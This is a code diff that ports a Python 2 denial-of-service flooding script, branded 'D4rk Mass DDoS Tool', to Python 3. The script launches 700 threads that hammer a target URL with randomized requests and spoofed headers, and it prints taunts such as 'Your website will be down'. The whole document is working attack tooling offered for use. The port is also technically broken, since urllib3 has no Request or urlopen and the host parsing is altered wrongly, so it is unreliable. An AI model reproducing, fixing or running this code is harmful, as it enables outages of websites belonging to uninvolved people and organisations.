@@ -8,7 +8,7 @@
 #Anonymous
 
 
-import urllib2
+import urllib3
 import sys
 import threading
 import random
@@ -83,8 +83,8 @@ def keyword_list():
         keyword_top.append('D4rkN3t')
 
 
-	headers_referers.append('http://' + host + '/')
-	return(headers_referers)
+        headers_referers.append('http://' + host + '/')
+        return(headers_referers)
 	
 #builds random ascii string
 def buildblock(size):
@@ -95,12 +95,12 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print 'D4rk Mass DDoS Tool created by D4rkN3n'
-	print 'Facebook Profile: https://www.facebook.com/profile.php?id=100013355013276'
-	print 'Usage: d4rk.py (url)'
-	print 'Example: d4rk.py http://target.com/'
-	print "\a"
-print \
+	print ('D4rk Mass DDoS Tool created by D4rkN3n')
+	print ('Facebook Profile: https://www.facebook.com/profile.php?id=100013355013276')
+	print ('Usage: d4rk.py (url)')
+	print ('Example: d4rk.py http://target.com/')
+	print ("\a")
+print(
 """                                                       
  (                    
  )\ )      )       )  
@@ -115,7 +115,7 @@ _________________________
                                                 
 """
 
-	
+)	
 #http request
 def httpcall(url):
 	useragent_list()
@@ -125,7 +125,7 @@ def httpcall(url):
 		param_joiner="&"
 	else:
 		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request = urllib3.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
@@ -134,23 +134,24 @@ def httpcall(url):
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
-			urllib2.urlopen(request)
-	except urllib2.HTTPError, e:
+			urllib3.urlopen(request)
+	except (urllib3.HTTPError):
 			#print e.code
 			set_flag(1)
+
             
- 			print '                                                                    '
- 			print '***** We Are Anonymous *****'
- 			print '***** Your website will be down *****'
- 			print '                                                                    '
+			print('                                                                    ')
+			print('***** We Are Anonymous *****')
+			print('***** Your website will be down *****')
+			print('                                                                    ')
                                                          
 			code=500
-	except urllib2.URLError, e:
+	except (urllib3.URLError):
 			#print e.reason
 			sys.exit()
 	else:
 			inc_counter()
-			urllib2.urlopen(request)
+			urllib3.urlopen(request)
 	return(code)		
 
 	
@@ -162,7 +163,7 @@ class HTTPThread(threading.Thread):
 				code=httpcall(url)
 				if (code==500) & (safe==1):
 					set_flag(2)
-		except Exception, ex:
+		except:
 			pass
 
 # monitors http threads and counts requests
@@ -170,11 +171,11 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+150<request_counter) & (previous<>request_counter):
-				print "#~~~>D4rk Virus Sended: %d Sending more<~~~#" % (request_counter)
+			if ((previous+150<request_counter) & (previous!=request_counter)):
+				print (f"#~~~>D4rk Virus Sended: {request_counter} Sending more<~~~#")
 				previous=request_counter
 		if flag==2:
-			print "\n ~>Stopping the mass DDoS Attack<~"
+			print("\n ~>Stopping the mass DDoS Attack<~")
 
 #execute 
 if len(sys.argv) < 2:
@@ -185,16 +186,21 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "Starting the D4rk Attack"
-		print "WTF U R DEAD"
+		print ("Starting the D4rk Attack")
+		print ("WTF U R DEAD")
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
-		m = re.search('http\://([^/]*)/?.*', url)
-		host = m.group(1)
+		try:
+			host = re.search('http\://([^/]*)/?.*', url).group()
+		except AttributeError:
+			print("Error: URL is not valid")
+			print("Add Http:// or Https:// to the URL")
+			# host = re.match("^.*(?=(\())", url)
+
 		for i in range(700):
 			t = HTTPThread()
 			t.start()
